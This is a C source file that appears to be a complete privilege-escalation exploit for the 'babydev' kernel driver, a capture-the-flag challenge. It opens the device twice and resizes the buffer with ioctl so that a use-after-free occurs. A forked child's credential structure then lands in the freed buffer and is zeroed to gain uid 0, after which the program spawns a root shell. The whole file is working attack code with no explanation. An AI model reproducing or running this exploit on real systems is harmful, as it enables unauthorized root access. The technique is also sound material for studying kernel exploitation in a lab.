#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<fcntl.h>
#include<sys/wait.h>
#include<sys/types.h>
#include<string.h>

int main()
{
	int fd1,fd2;
	char buf[0xa8];
	memset(buf,0,sizeof(buf));
	fd1 = open("/dev/babydev",O_RDWR);
	fd2 = open("/dev/babydev",O_RDWR);

	ioctl(fd1,0x10001,0xa8);
	close(fd1);
	int pid = fork();
	//uid_t uid = get_uid();
	if(pid < 0 ){
		printf("fork failure!\n");
	}
	else if(pid  == 0)
	{
		write(fd2,buf,0x28);
		uid_t uid = getuid();
		if(uid == 0)
		{
			printf("root shell!\n");
			system("/bin/sh\0");
			exit(0);
		}
		
	}
	else	wait(NULL);	
	close(fd2);
	return 0;
}
